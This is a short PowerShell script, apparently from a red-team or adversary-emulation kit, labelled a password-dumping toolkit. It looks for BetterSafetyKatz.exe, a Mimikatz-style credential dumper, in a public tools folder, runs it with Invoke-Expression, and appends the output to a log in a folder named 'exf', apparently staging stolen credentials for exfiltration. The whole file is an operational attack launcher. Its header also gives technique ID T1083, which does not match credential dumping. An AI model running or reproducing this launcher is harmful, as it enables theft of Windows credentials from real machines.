# Passwords dumps toolkit
# Technic ID : T1083
Clear-Host
Write-Output "==============================================================================="
Write-Output "Passwords Dumping toolkit (T1083)"
Write-Output "==============================================================================="
#
$BetterSafetyKatz = "$env:PUBLIC\Toolz\BetterSafetyKatz.exe";
$KatzLogFile = "$env:PUBLIC\exf\BetterSafetyKatz.txt";
if ([System.IO.File]::Exists("$BetterSafetyKatz")) 
    {
        Write-Output "GREAT. The command $BetterSafetyKatz has been found :-)" | Out-File -FilePath "$KatzLogFile"-Encoding ascii -Append;
        $ServiceCmd = "$BetterSafetyKatz";
        Invoke-Expression "$ServiceCmd"  | Out-File -FilePath "$KatzLogFile" -Append -Encoding ascii;
        exit 0;
    }
else 
    {
        Write-Output "The file $BetterSafetyKatz does not exists !!!" | Out-File -FilePath "$KatzLogFile" -Encoding ascii -Append;
        exit 1;
    };